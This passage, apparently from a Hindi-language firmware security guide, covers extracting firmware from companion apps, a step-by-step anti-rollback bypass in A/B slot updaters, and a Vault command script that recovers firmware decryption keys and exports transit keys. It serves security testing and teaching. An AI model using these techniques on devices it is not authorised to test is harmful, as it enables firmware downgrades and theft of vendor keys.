### Mobile Apps से Firmware निकालना

कई vendors अपने companion mobile applications में पूरे firmware images bundle करते हैं, ताकि app Bluetooth/Wi-Fi के ज़रिए device को update कर सके। ये packages आमतौर पर APK/APEX में `assets/fw/` या `res/raw/` जैसे paths पर unencrypted रखे जाते हैं। `apktool`, `ghidra` या साधारण `unzip` जैसे tools आपको physical hardware को छुए बिना signed images निकालने देते हैं।<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### A/B slot designs में केवल updater तक सीमित anti-rollback bypass

कुछ vendors anti-downgrade **ratchet** लागू करते हैं, लेकिन केवल *updater* logic के भीतर (उदाहरण के लिए, CAN पर UDS routine, recovery command या userspace OTA agent)। अगर **bootloader** बाद में केवल image signature/CRC जाँचता है और partition table या slot metadata पर भरोसा करता है, तो rollback protection को अब भी bypass किया जा सकता है।<sup>[[7]](#references)</sup>

आम तौर पर कमज़ोर design:

- Firmware metadata में version descriptor और **security ratchet** / monotonic counter, दोनों होते हैं।
- Updater image के ratchet की तुलना persistent storage में मौजूद value से करता है और पुराने signed images को अस्वीकार करता है।
- Bootloader उस ratchet को **parse नहीं** करता और चुने गए slot से boot करने से पहले केवल header, CRC और signature verify करता है।
- Slot activation को partition table या per-slot generation counter में अलग से store किया जाता है और इसे validated firmware के exact digest से **cryptographically bind नहीं** किया जाता।

इससे dual-slot systems में **एक image validate करो / दूसरी image boot करो** वाला primitive बनता है। अगर attacker updater से किसी current signed image का उपयोग करके slot B को अगला boot target mark करवा सकता है और reboot से पहले slot B को overwrite कर सकता है, तो bootloader downgraded image को boot कर सकता है, क्योंकि वह केवल पहले से commit किए गए slot metadata पर भरोसा करता है।

दुरुपयोग का आम तरीका:

1. **Current signed** firmware को passive slot में upload करें और सामान्य validation/switch routine चलाएँ, ताकि layout उस slot को next active के रूप में mark करे।
2. **अभी reboot न करें**। उसी session में slot-preparation/erase routine फिर से चलाएँ।
3. Stale boot-state या stale slot-selection logic का दुरुपयोग करके updater से उसी physical slot को erase करवाएँ जिसे अभी-अभी promote किया गया था।
4. उस slot में **पुराना, लेकिन अब भी signed** firmware लिखें।
5. Ratchet लागू करने वाली validation routine को छोड़ें और सीधे reboot करें।
6. Bootloader promoted slot चुनता है, केवल signature/integrity verify करता है और पुरानी image boot कर देता है।

A/B update implementations को reverse करते समय इन बातों पर ध्यान दें:

- Slot selection **boot-time flags** से तय होता है, जिन्हें सफल switch के बाद refresh नहीं किया जाता।
- `prepare_passive_slot()` जैसी routine **वर्तमान committed layout** के बजाय stale state के आधार पर slot erase करती है।
- `part_write_layout()` जैसा function केवल **generation counter** / active flag बढ़ाता है और validated image hash store नहीं करता।
- Ratchet checks userspace या updater code में लागू हैं, लेकिन ROM / bootloader / secure boot stages में **नहीं**।
- Erase या recovery routines content हटाने और फिर से लिखने के बाद भी slot को bootable mark छोड़ देती हैं।

### Update Logic का आकलन करने की Checklist

* क्या *update endpoint* का transport/authentication पर्याप्त रूप से सुरक्षित है (TLS + authentication)?
* क्या device flashing से पहले **version numbers** या **monotonic anti-rollback counter** की तुलना करता है?
* क्या image को secure boot chain के भीतर verify किया जाता है (उदाहरण के लिए, ROM code द्वारा signatures की जाँच)?
* क्या **bootloader updater जैसा ही ratchet लागू करता है**, या केवल signature/CRC जाँचता है?
* क्या slot activation metadata **validated firmware digest/version से bound** है, या promotion के बाद slot को बदला जा सकता है?
* Slot switch सफल होने के बाद, क्या device को reboot करना अनिवार्य है, या उसी session में बाद की update/erase routines अब भी उपलब्ध हैं?
* क्या userland code अतिरिक्त sanity checks करता है (उदाहरण के लिए, allowed partition map, model number)?
* क्या *partial* या *backup* update flows में वही validation logic दोबारा इस्तेमाल होती है?

> 💡  अगर ऊपर दी गई कोई भी चीज़ मौजूद नहीं है, तो platform संभवतः rollback attacks के प्रति vulnerable है।

## अभ्यास के लिए vulnerable firmware

Firmware में vulnerabilities खोजने का अभ्यास करने के लिए, शुरुआत में इन vulnerable firmware projects का उपयोग करें।

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Embedded KMS/Vault state से firmware decryption keys recover करना

जब कोई update image थोड़ा-सा plaintext metadata और एक बड़े high-entropy blob को मिलाकर रखती है, तो brute-forcing से पहले container triage करें:<sup>[[1]](#references)</sup>

- `hexdump`, `xxd`, `strings -tx`, `base64 -d` और `binwalk -E` से headers, offsets और line boundaries dump करें।
- `Salted__` का आम तौर पर मतलब OpenSSL `enc` format होता है: अगले 8 bytes salt होते हैं और बाकी bytes ciphertext।
- ऐसा Base64 field जो decode होकर ठीक `256` bytes का हो, इस बात का मज़बूत संकेत है कि आप RSA-2048 ciphertext देख रहे हैं, जो random firmware password/session key को wrap करता है।
- उसी file में मौजूद detached PGP material अक्सर केवल authenticity की रक्षा करता है; यह न मानें कि वही confidentiality mechanism है।

अगर static key hunting (`grep`, `strings`, PEM/PGP searches) से कुछ न मिले, तो केवल private keys खोजने के बजाय **operational decrypt path** को reverse करें:

- Updater / management binary decompile करें और trace करें कि encrypted blob कौन पढ़ता है, उसे कौन-सा helper/API unwrap करता है और वह कौन-सा logical key name माँगता है।
- Extracted root filesystem में KMS state (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) के साथ unit files और init scripts खोजें।
- Plaintext `vault operator unseal ...`, recovery keys, bootstrap tokens या local KMS auto-unseal scripts को private-key material के बराबर मानें।

अगर appliance में मूल Vault binary और storage backend शामिल हैं, तो Vault internals को दोबारा implement करने की तुलना में उस environment को replay करना आम तौर पर आसान होता है:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

cloned KMS पर root access के साथ:

- Transit keys को केवल isolated clone के अंदर exportable बनाएँ: `vault write transit/keys/<name>/config exportable=true`
- unwrap key export करें: `vault read transit/export/encryption-key/<name>`
- recovered RSA key को KMS में उपयोग किए गए exact padding/hash pair के साथ आज़माएँ। PKCS#1 v1.5 decrypt का असफल होना और default OAEP decrypt का असफल होना **यह साबित नहीं करता कि key गलत है**; Vault-backed flows में अक्सर SHA-256 वाला OAEP उपयोग होता है, जबकि common libraries का default SHA-1 होता है।
- यदि payload `Salted__` से शुरू होता है, तो AES-CBC decryption आज़माने से पहले vendor के OpenSSL KDF (`EVP_BytesToKey`, पुराने appliances में अक्सर MD5) को बिल्कुल उसी तरह दोहराएँ।

इससे “encrypted firmware” एक अधिक सामान्य समस्या बन जाता है: **appliance-side operational keys recover करें, फिर exact unwrap + KDF parameters को offline दोहराएँ**।

## प्रशिक्षण और प्रमाणपत्र

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Claude से Firmware Cracking: Senior-Level Skill, Junior-Level Autonomy](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Firmware Security Testing की कार्यप्रणाली](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Practical IoT Hacking: Internet of Things पर हमले करने की Definitive Guide](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [छोड़े जा चुके hardware में zero days का फायदा उठाना – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [एक $20 Smart Device ने मुझे आपके घर का Access कैसे दिया](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [अब आप mi को देखते हैं: अब आप Pwned हैं](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Tesla Wall Connector को उसके charge port connector से Exploit करना - Part 2: anti-downgrade को bypass करना](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [इसे Blink करें: Philips Hue Bridge का Over-the-Air Exploitation](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [QEMU पर ROOT Tesla OS Part 2: Debugging और Fixing](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
{{#include ../../banners/hacktricks-training.md}}
